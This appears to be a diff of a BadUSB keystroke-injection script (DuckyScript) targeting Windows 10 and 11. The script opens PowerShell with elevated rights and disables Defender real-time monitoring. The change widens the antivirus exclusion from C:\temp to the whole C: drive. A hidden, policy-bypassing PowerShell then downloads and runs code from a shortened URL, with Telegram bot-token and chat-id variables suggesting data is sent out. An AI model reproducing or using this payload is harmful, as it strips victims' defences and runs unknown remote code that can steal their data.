@@ -4,7 +4,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\temp'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='bot-token'; $ci='chat-id'; irm https://t.ly/-qlYd | iex'"
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='bot-token'; $ci='chat-id'; irm https://t.ly/-qlYd | iex'"
 CTRL-SHIFT ENTER
 DELAY 1000
 ALT y
